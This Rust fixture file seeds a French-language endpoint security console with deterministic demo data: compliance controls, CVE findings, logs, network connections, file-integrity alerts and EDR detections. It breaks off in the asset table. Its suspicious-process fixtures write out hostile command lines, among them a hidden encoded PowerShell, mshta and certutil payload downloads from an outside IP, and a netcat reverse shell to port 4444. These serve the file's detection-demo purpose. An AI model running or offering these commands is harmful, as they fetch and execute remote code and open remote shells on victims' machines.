//! Realistic fixture data for the preview harness.
//!
//! A security console is judged on its populated views — 150 packages, a
//! matrix of controls, a drawer full of CVE detail — not on its empty states.
//! `seed` fills every domain of `AppState` with plausible, deterministic data
//! so those views can be rendered, screenshotted and judged without an agent
//! runtime behind them. Nothing here is random: the same call yields the same
//! screen, which is what a review baseline needs.

// Fixture tables are tuple slices on purpose: a row per line reads like the
// data it seeds, which a struct per table would bury under field names.
#![allow(clippy::type_complexity)]

use agent_gui::app::AppState;
use agent_gui::dto::*;
use chrono::{DateTime, Duration, Utc};
use uuid::Uuid;

/// Tiny deterministic generator (LCG) so fixtures never pull in `rand`.
struct Seq(u64);

impl Seq {
    fn next(&mut self) -> u64 {
        self.0 = self
            .0
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        self.0 >> 33
    }
    fn unit(&mut self) -> f64 {
        (self.next() % 10_000) as f64 / 10_000.0
    }
    fn range(&mut self, lo: f64, hi: f64) -> f64 {
        lo + (hi - lo) * self.unit()
    }
}

fn id(n: u128) -> Uuid {
    Uuid::from_u128(0x5e17_1e1a_0000_0000_0000_0000_0000_0000 + n)
}

fn ago(minutes: i64) -> DateTime<Utc> {
    Utc::now() - Duration::minutes(minutes)
}

fn days_ago(days: i64) -> DateTime<Utc> {
    Utc::now() - Duration::days(days)
}

/// Populate every domain of the state.
pub fn seed(state: &mut AppState) {
    state.settings.server_url = "https://grc.cyber-threat-consulting.com".into();
    let mut rng = Seq(42);

    // ── Agent summary ─────────────────────────────────────────────────
    let policy = GuiPolicySummary {
        total_policies: 21,
        passing: 17,
        failing: 3,
        errors: 1,
        pending: 0,
    };
    state.summary = AgentSummary {
        status: GuiAgentStatus::Connected,
        version: "4.0.1".into(),
        hostname: "PC-DSI-114".into(),
        agent_id: Some("a7c3e1f9-4b2d-4e8a-9c1f-2d5b7e9a3c61".into()),
        organization: Some("Cyber Threat Consulting".into()),
        compliance_score: Some(87.4),
        last_check_at: Some(ago(12)),
        last_sync_at: Some(ago(4)),
        pending_sync_count: 3,
        uptime_secs: 3 * 86_400 + 5 * 3_600 + 17 * 60,
        active_frameworks: Some(
            ["CIS", "NIS2", "ISO 27001", "DORA"]
                .iter()
                .map(|s| s.to_string())
                .collect(),
        ),
        policy_summary: Some(policy),
    };
    state.policy = policy;
    state.previous_compliance_score = Some(83.1);
    state.unread_notification_count = 7;

    // ── Resources + 2 h of history at 1 sample / minute ───────────────
    state.resources = GuiResourceUsage {
        cpu_percent: 23.4,
        memory_percent: 61.2,
        memory_used_mb: 9_802,
        memory_total_mb: 16_000,
        disk_kbps: 340,
        uptime_secs: state.summary.uptime_secs,
        disk_percent: 72.5,
        network_io_bytes: 1_240_000,
    };
    let t0 = state.summary.uptime_secs as f64 - 120.0 * 60.0;
    for i in 0..120 {
        let t = t0 + i as f64 * 60.0;
        let phase = i as f64 / 120.0 * std::f64::consts::TAU;
        let cpu = 18.0
            + 9.0 * (phase * 3.0).sin()
            + rng.range(-3.0, 3.0)
            + if (40..46).contains(&i) { 55.0 } else { 0.0 };
        let mem = 58.0 + 4.0 * (phase * 0.7).sin() + rng.range(-0.8, 0.8);
        let disk = 120.0 + 200.0 * (phase * 5.0).sin().abs() + rng.range(0.0, 60.0);
        let net = 400.0 + 900.0 * rng.unit() + if (40..46).contains(&i) { 4_000.0 } else { 0.0 };
        state
            .monitoring
            .cpu_history
            .push_back([t, cpu.clamp(0.0, 100.0)]);
        state.monitoring.memory_history.push_back([t, mem]);
        state.monitoring.disk_io_history.push_back([t, disk]);
        state.monitoring.network_io_history.push_back([t, net]);
    }

    // ── Compliance checks (21 controls, 4 frameworks) ─────────────────
    let controls: &[(&str, &str, &str, GuiCheckStatus, Severity, &[&str], &str)] = &[
        (
            "CIS-1.1",
            "Chiffrement du disque système",
            "encryption",
            GuiCheckStatus::Pass,
            Severity::Critical,
            &["CIS", "ISO 27001", "NIS2"],
            "BitLocker actif sur C:, XTS-AES 256.",
        ),
        (
            "CIS-1.2",
            "Chiffrement des volumes de données",
            "encryption",
            GuiCheckStatus::Pass,
            Severity::High,
            &["CIS", "ISO 27001"],
            "Volume D: chiffré.",
        ),
        (
            "CIS-2.1",
            "Antivirus actif et à jour",
            "antivirus",
            GuiCheckStatus::Pass,
            Severity::Critical,
            &["CIS", "NIS2", "DORA"],
            "Defender 4.18, signatures du jour.",
        ),
        (
            "CIS-2.2",
            "Protection temps réel",
            "antivirus",
            GuiCheckStatus::Pass,
            Severity::High,
            &["CIS"],
            "Activée.",
        ),
        (
            "CIS-3.1",
            "Pare-feu activé sur tous les profils",
            "firewall",
            GuiCheckStatus::Fail,
            Severity::High,
            &["CIS", "NIS2"],
            "Profil « Public » désactivé.",
        ),
        (
            "CIS-3.2",
            "Règles entrantes par défaut : bloquer",
            "firewall",
            GuiCheckStatus::Pass,
            Severity::Medium,
            &["CIS"],
            "OK.",
        ),
        (
            "CIS-4.1",
            "Mises à jour système appliquées",
            "updates",
            GuiCheckStatus::Fail,
            Severity::Critical,
            &["CIS", "NIS2", "DORA", "ISO 27001"],
            "3 correctifs critiques en attente (KB5041585).",
        ),
        (
            "CIS-4.2",
            "Mises à jour automatiques",
            "updates",
            GuiCheckStatus::Pass,
            Severity::Medium,
            &["CIS"],
            "Actives.",
        ),
        (
            "CIS-5.1",
            "Politique de mot de passe (≥ 12, complexité)",
            "password",
            GuiCheckStatus::Pass,
            Severity::High,
            &["CIS", "ISO 27001"],
            "14 caractères, complexité imposée.",
        ),
        (
            "CIS-5.2",
            "Verrouillage après 5 échecs",
            "password",
            GuiCheckStatus::Pass,
            Severity::Medium,
            &["CIS"],
            "5 échecs / 15 min.",
        ),
        (
            "CIS-5.3",
            "Verrouillage de session (≤ 10 min)",
            "access",
            GuiCheckStatus::Fail,
            Severity::Medium,
            &["CIS", "ISO 27001"],
            "Délai configuré à 30 min.",
        ),
        (
            "CIS-6.1",
            "Comptes administrateurs locaux limités",
            "access",
            GuiCheckStatus::Pass,
            Severity::High,
            &["CIS", "NIS2"],
            "1 compte admin local.",
        ),
        (
            "CIS-6.2",
            "Compte invité désactivé",
            "access",
            GuiCheckStatus::Pass,
            Severity::Low,
            &["CIS"],
            "Désactivé.",
        ),
        (
            "CIS-7.1",
            "Journalisation des événements de sécurité",
            "logging",
            GuiCheckStatus::Pass,
            Severity::High,
            &["CIS", "NIS2", "DORA"],
            "Audit avancé activé, 512 Mo.",
        ),
        (
            "CIS-7.2",
            "Transfert des journaux vers le SIEM",
            "logging",
            GuiCheckStatus::Pass,
            Severity::Medium,
            &["NIS2", "DORA"],
            "Syslog TLS → siem.ctc.local.",
        ),
        (
            "CIS-8.1",
            "Sauvegarde récente vérifiée",
            "backup",
            GuiCheckStatus::Error,
            Severity::High,
            &["ISO 27001", "DORA"],
            "Impossible de joindre l'agent de sauvegarde.",
        ),
        (
            "CIS-9.1",
            "SMBv1 désactivé",
            "network",
            GuiCheckStatus::Pass,
            Severity::Critical,
            &["CIS"],
            "Désactivé.",
        ),
        (
            "CIS-9.2",
            "RDP restreint (NLA)",
            "network",
            GuiCheckStatus::Pass,
            Severity::High,
            &["CIS", "NIS2"],
            "NLA imposé.",
        ),
        (
            "CIS-9.3",
            "Bluetooth désactivé si inutilisé",
            "network",
            GuiCheckStatus::Pass,
            Severity::Low,
            &["CIS"],
            "Désactivé.",
        ),
        (
            "CIS-10.1",
            "Contrôle des périphériques USB",
            "access",
            GuiCheckStatus::Pass,
            Severity::Medium,
            &["ISO 27001"],
            "Stockage amovible bloqué.",
        ),
        (
            "CIS-10.2",
            "Intégrité des fichiers système",
            "encryption",
            GuiCheckStatus::Pass,
            Severity::High,
            &["NIS2", "DORA"],
            "1 284 fichiers surveillés.",
        ),
    ];
    state.checks = controls
        .iter()
        .enumerate()
        .map(
            |(i, (cid, name, cat, status, sev, fws, msg))| GuiCheckResult {
                check_id: cid.to_string(),
                name: name.to_string(),
                category: cat.to_string(),
                status: *status,
                severity: *sev,
                score: Some(match status {
                    GuiCheckStatus::Pass => 100,
                    GuiCheckStatus::Fail => 0,
                    _ => 50,
                }),
                message: Some(msg.to_string()),
                details: None,
                executed_at: Some(ago(12 + i as i64 % 3)),
                frameworks: fws.iter().map(|s| s.to_string()).collect(),
            },
        )
        .collect();

    // ── Vulnerabilities ───────────────────────────────────────────────
    state.vulnerability_summary = Some(GuiVulnerabilitySummary {
        critical: 2,
        high: 5,
        medium: 9,
        low: 6,
        last_scan_at: Some(ago(12)),
    });
    let vulns: &[(&str, &str, &str, Severity, f32, bool, Option<&str>, &str)] = &[
        (
            "CVE-2024-3094",
            "xz-utils",
            "5.6.0",
            Severity::Critical,
            10.0,
            true,
            Some("5.6.2"),
            "Porte dérobée dans liblzma permettant l'exécution de code via sshd.",
        ),
        (
            "CVE-2024-6387",
            "openssh-server",
            "9.6p1",
            Severity::Critical,
            8.1,
            true,
            Some("9.8p1"),
            "Condition de concurrence dans le gestionnaire de signaux (regreSSHion) : RCE en root non authentifiée.",
        ),
        (
            "CVE-2024-21762",
            "FortiClient VPN",
            "7.0.11",
            Severity::High,
            9.6,
            true,
            Some("7.0.12"),
            "Écriture hors limites dans sslvpnd permettant l'exécution de code à distance.",
        ),
        (
            "CVE-2023-4863",
            "libwebp",
            "1.2.4",
            Severity::High,
            8.8,
            true,
            Some("1.3.2"),
            "Dépassement de tampon dans le décodage WebP (exploité activement).",
        ),
        (
            "CVE-2023-38545",
            "curl",
            "8.3.0",
            Severity::High,
            9.8,
            true,
            Some("8.4.0"),
            "Dépassement de tas dans la négociation SOCKS5.",
        ),
        (
            "CVE-2024-38063",
            "Windows TCP/IP",
            "10.0.19045",
            Severity::High,
            9.8,
            true,
            Some("KB5041585"),
            "RCE via paquets IPv6 spécialement conçus.",
        ),
        (
            "CVE-2024-4577",
            "php-cgi",
            "8.2.13",
            Severity::High,
            9.8,
            false,
            None,
            "Injection d'arguments sur les locales Windows.",
        ),
        (
            "CVE-2023-44487",
            "nginx",
            "1.24.0",
            Severity::Medium,
            7.5,
            true,
            Some("1.25.3"),
            "HTTP/2 Rapid Reset : déni de service.",
        ),
        (
            "CVE-2024-1086",
            "linux-kernel",
            "6.1.0",
            Severity::Medium,
            7.8,
            true,
            Some("6.1.76"),
            "Use-after-free dans netfilter nf_tables : élévation de privilèges locale.",
        ),
        (
            "CVE-2023-23397",
            "Microsoft Outlook",
            "16.0.16130",
            Severity::Medium,
            9.8,
            true,
            Some("16.0.16227"),
            "Élévation de privilèges via rappel de notification.",
        ),
        (
            "CVE-2024-30078",
            "Wi-Fi driver",
            "22.240.0",
            Severity::Medium,
            8.8,
            false,
            None,
            "RCE via le pilote Wi-Fi Windows.",
        ),
        (
            "CVE-2024-24919",
            "Check Point VPN",
            "R81.10",
            Severity::Medium,
            8.6,
            true,
            Some("R81.10 T335"),
            "Lecture arbitraire de fichiers sur la passerelle.",
        ),
        (
            "CVE-2023-20198",
            "Cisco IOS XE",
            "17.6.3",
            Severity::Low,
            10.0,
            true,
            Some("17.6.6"),
            "Création de compte via l'interface web (poste non exposé).",
        ),
        (
            "CVE-2024-3400",
            "PAN-OS GlobalProtect",
            "10.2.7",
            Severity::Low,
            10.0,
            true,
            Some("10.2.9-h1"),
            "Injection de commande (client uniquement, non exploitable ici).",
        ),
    ];
    state.vulnerability_findings = vulns
        .iter()
        .enumerate()
        .map(|(i, (cve, sw, ver, sev, cvss, fix, fixed, desc))| GuiVulnerabilityFinding {
            cve_id: cve.to_string(),
            affected_software: sw.to_string(),
            affected_version: ver.to_string(),
            severity: *sev,
            cvss_score: Some(*cvss),
            description: desc.to_string(),
            fix_available: *fix,
            discovered_at: Some(ago(12 + i as i64 * 37)),
            source: if i % 3 == 0 { "NVD" } else { "OSV" }.to_string(),
            fixed_version: fixed.map(|s| s.to_string()),
            remediation: fixed.map(|v| format!("Mettre à jour {sw} vers {v}.")),
            ai_confidence: Some(72 + (i as u8 * 5) % 26),
            is_false_positive: if i == 13 { Some(true) } else { None },
            ai_analysis: (i < 2).then(|| "Exploitation active observée ; le composant est exposé sur le poste. Priorité immédiate.".to_string()),
            ai_remediation_script: (i == 0).then(|| vec!["sudo apt-get update".into(), "sudo apt-get install --only-upgrade xz-utils".into(), "systemctl restart ssh".into()]),
            ai_remediation_explanation: (i == 0).then(|| "Met à jour liblzma vers une version non compromise puis redémarre sshd pour recharger la bibliothèque.".into()),
        })
        .collect();

    // ── Logs / terminal ───────────────────────────────────────────────
    let log_lines: &[(&str, &str, &str)] = &[
        (
            "INFO",
            "scanner",
            "Analyse de conformité terminée : 21 contrôles, 17 conformes, 3 défaillants, 1 erreur",
        ),
        (
            "WARN",
            "firewall",
            "Profil « Public » désactivé — contrôle CIS-3.1 en échec",
        ),
        (
            "ERROR",
            "backup",
            "Agent de sauvegarde injoignable (timeout 30 s) — CIS-8.1 en erreur",
        ),
        (
            "INFO",
            "sync",
            "Synchronisation : 148 actifs poussés, 3 en attente",
        ),
        ("INFO", "fim", "Baseline recalculée : 1 284 fichiers"),
        (
            "WARN",
            "fim",
            "/etc/sudoers modifié (hash différent de la baseline)",
        ),
        (
            "INFO",
            "edr",
            "Pipeline de menaces : 4 processus suspects classifiés",
        ),
        ("WARN", "edr", "powershell.exe -enc … (PID 4812) — score 91"),
        ("DEBUG", "heartbeat", "Heartbeat accepté (latence 84 ms)"),
        (
            "INFO",
            "vuln",
            "Scan CVE : 151 paquets, 22 vulnérabilités (2 critiques)",
        ),
        (
            "ERROR",
            "vuln",
            "CVE-2024-3094 détectée sur xz-utils 5.6.0 — exploitation active",
        ),
        ("INFO", "siem", "48 210 événements transmis, 12 rejetés"),
        (
            "DEBUG",
            "network",
            "Découverte passive : 9 équipements sur 192.168.1.0/24",
        ),
        (
            "WARN",
            "network",
            "Connexion sortante vers 185.220.101.4:9001 (Tor exit) par curl.exe",
        ),
        (
            "INFO",
            "update",
            "Version 4.1.0 disponible (signature vérifiée)",
        ),
        ("TRACE", "gui", "Repaint demandé par le canal d'événements"),
    ];
    for (i, (lvl, src, msg)) in log_lines.iter().enumerate() {
        state.logs.push_back(GuiLogEntry {
            id: id(100 + i as u128),
            timestamp: ago(i as i64 * 3),
            level: lvl.to_string(),
            message: msg.to_string(),
            source: Some(src.to_string()),
        });
    }
    // The terminal page reads its own ring buffer, newest last.
    for (i, (lvl, src, msg)) in log_lines.iter().enumerate().rev() {
        state
            .terminal
            .lines
            .push_back(agent_gui::events::TerminalLogEntry {
                timestamp: ago(i as i64 * 3),
                level: lvl.to_string(),
                target: format!("sentinel_agent::{src}"),
                message: msg.to_string(),
            });
    }
    state.terminal.event_count = 1_284 + log_lines.len() as u64;
    state.terminal.error_count = log_lines
        .iter()
        .filter(|(lvl, _, _)| *lvl == "ERROR")
        .count() as u64;

    // ── Notifications ─────────────────────────────────────────────────
    let notifs: &[(&str, &str, &str, bool, i64)] = &[
        (
            "Vulnérabilité critique détectée",
            "CVE-2024-3094 sur xz-utils 5.6.0 — porte dérobée, exploitation active.",
            "critical",
            false,
            12,
        ),
        (
            "Processus suspect bloqué",
            "powershell.exe lancé avec une commande encodée (PID 4812), score 91.",
            "high",
            false,
            27,
        ),
        (
            "Fichier système modifié",
            "/etc/sudoers ne correspond plus à la baseline d'intégrité.",
            "high",
            false,
            41,
        ),
        (
            "Contrôle de conformité en échec",
            "CIS-4.1 : 3 correctifs critiques en attente.",
            "medium",
            false,
            58,
        ),
        (
            "Connexion sortante inhabituelle",
            "curl.exe vers 185.220.101.4:9001 (nœud de sortie Tor).",
            "high",
            false,
            73,
        ),
        (
            "Synchronisation partielle",
            "3 éléments en attente de transmission vers la plateforme.",
            "low",
            false,
            96,
        ),
        (
            "Mise à jour disponible",
            "Sentinel Agent 4.1.0 — signature éditeur vérifiée.",
            "info",
            false,
            130,
        ),
        (
            "Analyse terminée",
            "21 contrôles évalués, score 87,4 %.",
            "info",
            true,
            190,
        ),
        (
            "Sauvegarde vérifiée",
            "Dernière sauvegarde complète il y a 2 jours.",
            "info",
            true,
            2_900,
        ),
    ];
    for (i, (title, body, sev, read, mins)) in notifs.iter().enumerate() {
        state.notifications.push(GuiNotification {
            id: id(200 + i as u128),
            title: title.to_string(),
            body: body.to_string(),
            severity: sev.to_string(),
            timestamp: ago(*mins),
            read: *read,
            action: (i < 3).then(|| "Voir le détail".to_string()),
        });
    }

    // ── Network ───────────────────────────────────────────────────────
    state.network.interfaces = vec![
        GuiNetworkInterface {
            name: "eth0".into(),
            mac_address: Some("3C:7C:3F:1A:9B:E2".into()),
            ipv4_addresses: vec!["192.168.1.114".into()],
            status: "up".into(),
            interface_type: "ethernet".into(),
        },
        GuiNetworkInterface {
            name: "wlan0".into(),
            mac_address: Some("A4:C3:F0:5D:22:71".into()),
            ipv4_addresses: vec![],
            status: "down".into(),
            interface_type: "wifi".into(),
        },
        GuiNetworkInterface {
            name: "docker0".into(),
            mac_address: Some("02:42:8E:11:0C:5A".into()),
            ipv4_addresses: vec!["172.17.0.1".into()],
            status: "up".into(),
            interface_type: "bridge".into(),
        },
        GuiNetworkInterface {
            name: "lo".into(),
            mac_address: None,
            ipv4_addresses: vec!["127.0.0.1".into()],
            status: "up".into(),
            interface_type: "loopback".into(),
        },
    ];
    let conns: &[(&str, u16, Option<&str>, Option<u16>, &str, &str)] = &[
        ("TCP", 22, None, None, "LISTEN", "sshd"),
        ("TCP", 443, None, None, "LISTEN", "nginx"),
        ("TCP", 5432, None, None, "LISTEN", "postgres"),
        (
            "TCP",
            49812,
            Some("142.250.74.206"),
            Some(443),
            "ESTABLISHED",
            "chrome",
        ),
        (
            "TCP",
            49830,
            Some("52.97.201.18"),
            Some(443),
            "ESTABLISHED",
            "outlook",
        ),
        (
            "TCP",
            49871,
            Some("185.220.101.4"),
            Some(9001),
            "ESTABLISHED",
            "curl",
        ),
        (
            "TCP",
            49902,
            Some("192.168.1.20"),
            Some(445),
            "ESTABLISHED",
            "System",
        ),
        (
            "TCP",
            49915,
            Some("10.8.0.1"),
            Some(8443),
            "ESTABLISHED",
            "sentinel-agent",
        ),
        ("UDP", 5353, None, None, "", "mdns"),
        ("UDP", 68, None, None, "", "dhclient"),
        (
            "TCP",
            49960,
            Some("104.18.32.7"),
            Some(443),
            "TIME_WAIT",
            "chrome",
        ),
        (
            "TCP",
            49961,
            Some("104.18.32.7"),
            Some(443),
            "TIME_WAIT",
            "chrome",
        ),
        ("TCP", 3389, None, None, "LISTEN", "svchost"),
        (
            "TCP",
            50012,
            Some("192.168.1.1"),
            Some(53),
            "CLOSE_WAIT",
            "dns",
        ),
    ];
    state.network.connections = conns
        .iter()
        .map(|(proto, lp, ra, rp, st, pn)| GuiNetworkConnection {
            protocol: proto.to_string(),
            local_address: "192.168.1.114".into(),
            local_port: *lp,
            remote_address: ra.map(|s| s.to_string()),
            remote_port: *rp,
            state: st.to_string(),
            process_name: Some(pn.to_string()),
        })
        .collect();
    state.network.alerts.push_back(GuiNetworkAlert {
        alert_type: "tor_exit".into(),
        severity: Severity::High,
        description: "Connexion sortante vers un nœud de sortie Tor connu".into(),
        source_ip: Some("192.168.1.114".into()),
        destination_ip: Some("185.220.101.4".into()),
        destination_port: Some(9001),
        confidence: 88,
        detected_at: ago(73),
        ai_confidence: Some(91),
        is_false_positive: None,
        ai_analysis: Some("curl.exe n'a pas de raison métier de joindre un relais Tor ; probable exfiltration ou C2.".into()),
    });
    state.network.alerts.push_back(GuiNetworkAlert {
        alert_type: "port_scan".into(),
        severity: Severity::Medium,
        description: "Balayage de ports entrant depuis 192.168.1.77 (22 ports en 4 s)".into(),
        source_ip: Some("192.168.1.77".into()),
        destination_ip: Some("192.168.1.114".into()),
        destination_port: None,
        confidence: 74,
        detected_at: ago(210),
        ai_confidence: Some(70),
        is_false_positive: None,
        ai_analysis: None,
    });
    state.network.alerts.push_back(GuiNetworkAlert {
        alert_type: "rogue_dhcp".into(),
        severity: Severity::Low,
        description: "Second serveur DHCP observé (192.168.1.250)".into(),
        source_ip: Some("192.168.1.250".into()),
        destination_ip: None,
        destination_port: Some(67),
        confidence: 60,
        detected_at: ago(1_400),
        ai_confidence: None,
        is_false_positive: Some(true),
        ai_analysis: Some("Box opérateur de secours déclarée par la DSI.".into()),
    });
    state.network.interface_count = 4;
    state.network.connection_count = state.network.connections.len() as u32;
    state.network.alert_count = 3;
    state.network.primary_ip = Some("192.168.1.114".into());
    state.network.primary_mac = Some("3C:7C:3F:1A:9B:E2".into());
    state.network.last_scan = Some(ago(9));

    // ── Discovery / cartography ───────────────────────────────────────
    let devices: &[(&str, &str, Option<&str>, &str, &str, &[u16], bool)] = &[
        (
            "192.168.1.1",
            "C0:3F:0E:A1:00:01",
            Some("bbox.lan"),
            "Sagemcom",
            "router",
            &[53, 80, 443],
            true,
        ),
        (
            "192.168.1.20",
            "00:11:32:9A:BC:DE",
            Some("nas-archive-02"),
            "Synology",
            "nas",
            &[22, 139, 445, 5000],
            false,
        ),
        (
            "192.168.1.30",
            "B4:2E:99:71:0A:C3",
            Some("hp-m479"),
            "HP",
            "printer",
            &[80, 515, 9100],
            false,
        ),
        (
            "192.168.1.42",
            "9C:8E:CD:44:12:F0",
            None,
            "Hikvision",
            "camera",
            &[80, 554],
            false,
        ),
        (
            "192.168.1.77",
            "F4:5C:89:2B:77:11",
            Some("kali-audit"),
            "Intel",
            "laptop",
            &[22],
            false,
        ),
        (
            "192.168.1.101",
            "A8:5E:45:0D:3B:9A",
            Some("iphone-thibault"),
            "Apple",
            "phone",
            &[],
            false,
        ),
        (
            "192.168.1.114",
            "3C:7C:3F:1A:9B:E2",
            Some("PC-DSI-114"),
            "Dell",
            "workstation",
            &[22, 443, 3389],
            false,
        ),
        (
            "192.168.1.150",
            "DC:A6:32:1F:8E:07",
            Some("raspberrypi"),
            "Raspberry Pi",
            "iot",
            &[22, 1883],
            false,
        ),
        (
            "192.168.1.250",
            "E8:DE:27:5C:00:9B",
            None,
            "TP-Link",
            "router",
            &[67, 80],
            false,
        ),
    ];
    state.discovery.devices = devices
        .iter()
        .enumerate()
        .map(
            |(i, (ip, mac, host, vendor, kind, ports, gw))| GuiDiscoveredDevice {
                ip: ip.to_string(),
                mac: Some(mac.to_string()),
                hostname: host.map(|s| s.to_string()),
                vendor: Some(vendor.to_string()),
                device_type: kind.to_string(),
                open_ports: ports.to_vec(),
                first_seen: days_ago(30 - i as i64 * 3),
                last_seen: ago(i as i64 * 7),
                is_gateway: *gw,
                subnet: "192.168.1.0/24".into(),
            },
        )
        .collect();
    state.discovery.enabled = true;
    state.discovery.phase = "Écoute passive (mDNS, SSDP, ARP)".into();

    // ── FIM ───────────────────────────────────────────────────────────
    state.fim.monitored_count = 1_284;
    state.fim.changes_today = 6;
    let fim: &[(&str, FimChangeType, bool, i64)] = &[
        ("/etc/sudoers", FimChangeType::Modified, false, 41),
        (
            "/etc/ssh/sshd_config",
            FimChangeType::PermissionChanged,
            false,
            55,
        ),
        (
            "/usr/local/bin/backup-agent",
            FimChangeType::Deleted,
            false,
            240,
        ),
        (
            "/etc/cron.d/sentinel-scan",
            FimChangeType::Created,
            true,
            610,
        ),
        ("/etc/hosts", FimChangeType::Modified, true, 1_320),
        ("/boot/grub/grub.cfg", FimChangeType::Renamed, true, 2_880),
    ];
    for (i, (path, kind, ack, mins)) in fim.iter().enumerate() {
        state.fim.alerts.push_back(GuiFimAlert {
            id: format!("fim-{i:04}"),
            path: path.to_string(),
            change_type: *kind,
            old_hash: Some(format!("{:016x}9f8a2b1c", 0x3a5f_0000u64 + i as u64)),
            new_hash: (*kind != FimChangeType::Deleted)
                .then(|| format!("{:016x}c4d7e10b", 0x7b21_0000u64 + i as u64)),
            timestamp: ago(*mins),
            acknowledged: *ack,
        });
    }

    // ── Threats (EDR) ─────────────────────────────────────────────────
    let procs: &[(&str, u32, &str, &str, u8, i64)] = &[
        (
            "powershell.exe",
            4812,
            "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA…",
            "Commande encodée en base64 avec fenêtre masquée",
            91,
            27,
        ),
        (
            "mshta.exe",
            5120,
            "mshta.exe http://185.220.101.4/a.hta",
            "Exécution d'un script HTA distant",
            84,
            26,
        ),
        (
            "certutil.exe",
            5177,
            "certutil.exe -urlcache -split -f http://185.220.101.4/p.bin C:\\Users\\Public\\p.bin",
            "Téléchargement via certutil (LOLBin)",
            79,
            25,
        ),
        (
            "nc.exe",
            5203,
            "nc.exe -e cmd.exe 185.220.101.4 4444",
            "Reverse shell netcat",
            96,
            24,
        ),
    ];
    for (i, (name, pid, cmd, reason, conf, mins)) in procs.iter().enumerate() {
        state.threats.suspicious_processes.push_back(GuiSuspiciousProcess {
            process_name: name.to_string(),
            pid: *pid,
            command_line: cmd.to_string(),
            reason: reason.to_string(),
            confidence: *conf,
            detected_at: ago(*mins),
            ai_confidence: Some(conf.saturating_add(3)),
            is_false_positive: None,
            ai_analysis: (i == 0).then(|| "Chaîne classique de compromission initiale : PowerShell encodé → téléchargement → reverse shell. Isoler le poste.".into()),
        });
    }
    state.threats.system_incidents.push_back(GuiSystemIncident {
        incident_type: "privilege_escalation".into(),
        severity: Severity::Critical,
        title: "Élévation de privilèges suspecte".into(),
        description: "Ajout de l'utilisateur « svc-print » au groupe Administrateurs par powershell.exe (PID 4812).".into(),
        confidence: 89,
        detected_at: ago(22),
        ai_confidence: Some(92),
        is_false_positive: None,
        ai_analysis: None,
    });
    state.threats.system_incidents.push_back(GuiSystemIncident {
        incident_type: "persistence".into(),
        severity: Severity::High,
        title: "Persistance par tâche planifiée".into(),
        description:
            "Tâche « OneDriveUpdaterX » créée, lançant C:\\Users\\Public\\p.bin toutes les 10 min."
                .into(),
        confidence: 83,
        detected_at: ago(20),
        ai_confidence: Some(85),
        is_false_positive: None,
        ai_analysis: None,
    });
    state.threats.system_incidents.push_back(GuiSystemIncident {
        incident_type: "tamper".into(),
        severity: Severity::Medium,
        title: "Tentative d'arrêt de l'agent".into(),
        description: "sc.exe stop SentinelAgent refusé (auto-protection).".into(),
        confidence: 97,
        detected_at: ago(18),
        ai_confidence: None,
        is_false_positive: None,
        ai_analysis: None,
    });
    for (i, (name, vid, pid, kind, mins)) in [
        (
            "SanDisk Ultra 64 Go",
            0x0781u16,
            0x5581u16,
            UsbEventType::Blocked,
            95i64,
        ),
        (
            "Logitech MX Keys",
            0x046D,
            0xB35B,
            UsbEventType::Connected,
            480,
        ),
        (
            "Apple iPhone",
            0x05AC,
            0x12A8,
            UsbEventType::Disconnected,
            1_500,
        ),
    ]
    .iter()
    .enumerate()
    {
        let _ = i;
        state.threats.usb_events.push_back(GuiUsbEvent {
            device_name: name.to_string(),
            vendor_id: *vid,
            product_id: *pid,
            event_type: *kind,
            timestamp: ago(*mins),
        });
    }

    // ── Software ──────────────────────────────────────────────────────
    let pkgs: &[(&str, &str, &str, bool, Option<&str>)] = &[
        ("xz-utils", "5.6.0", "Tukaani", false, Some("5.6.2")),
        ("openssh-server", "9.6p1", "OpenBSD", false, Some("9.8p1")),
        ("curl", "8.3.0", "Daniel Stenberg", false, Some("8.4.0")),
        ("nginx", "1.24.0", "F5", false, Some("1.25.3")),
        ("libwebp", "1.2.4", "Google", false, Some("1.3.2")),
        ("openssl", "3.0.13", "OpenSSL Foundation", true, None),
        ("python3", "3.11.9", "PSF", true, None),
        ("nodejs", "20.12.2", "OpenJS Foundation", true, None),
        ("git", "2.43.0", "Software Freedom Conservancy", true, None),
        ("sudo", "1.9.15p5", "Todd Miller", true, None),
        ("glibc", "2.39", "GNU", true, None),
        ("systemd", "255.4", "systemd", true, None),
        ("docker-ce", "26.1.3", "Docker Inc.", true, None),
        ("postgresql-client", "16.2", "PostgreSQL GDG", true, None),
        ("vim", "9.1.0016", "Bram Moolenaar", true, None),
        ("gnupg", "2.4.4", "GnuPG", true, None),
        ("ca-certificates", "20240203", "Mozilla", true, None),
        ("tzdata", "2024a", "IANA", true, None),
        ("bash", "5.2.21", "GNU", true, None),
        (
            "chromium",
            "124.0.6367",
            "Google",
            false,
            Some("125.0.6422"),
        ),
        ("firefox-esr", "115.10.0", "Mozilla", true, None),
        (
            "libreoffice",
            "24.2.3",
            "The Document Foundation",
            true,
            None,
        ),
        ("7zip", "23.01", "Igor Pavlov", true, None),
        ("wireshark", "4.2.4", "Wireshark Foundation", true, None),
    ];
    state.software.packages = pkgs
        .iter()
        .enumerate()
        .map(|(i, (n, v, p, up, latest))| GuiSoftwarePackage {
            name: n.to_string(),
            version: v.to_string(),
            publisher: Some(p.to_string()),
            installed_at: Some(days_ago(3 + (i as i64 * 11) % 400)),
            up_to_date: *up,
            latest_version: latest.map(|s| s.to_string()),
        })
        .collect();
    state.software.native_apps = vec![
        GuiNativeApp {
            name: "Microsoft Teams".into(),
            version: "24.2.1".into(),
            bundle_id: "com.microsoft.teams2".into(),
            publisher: "Microsoft".into(),
            path: "/Applications/Microsoft Teams.app".into(),
        },
        GuiNativeApp {
            name: "Slack".into(),
            version: "4.38.125".into(),
            bundle_id: "com.tinyspeck.slackmacgap".into(),
            publisher: "Slack Technologies".into(),
            path: "/Applications/Slack.app".into(),
        },
        GuiNativeApp {
            name: "1Password".into(),
            version: "8.10.34".into(),
            bundle_id: "com.1password.1password".into(),
            publisher: "AgileBits".into(),
            path: "/Applications/1Password.app".into(),
        },
    ];

    // ── Assets (CMDB) ─────────────────────────────────────────────────
    let assets: &[(
        &str,
        &str,
        &str,
        &str,
        AssetCriticality,
        AssetLifecycle,
        f32,
        u32,
        &[u16],
        &[&str],
    )] = &[
        (
            "192.168.1.114",
            "PC-DSI-114",
            "Dell",
            "workstation",
            AssetCriticality::High,
            AssetLifecycle::Monitored,
            74.0,
            22,
            &[22, 443, 3389],
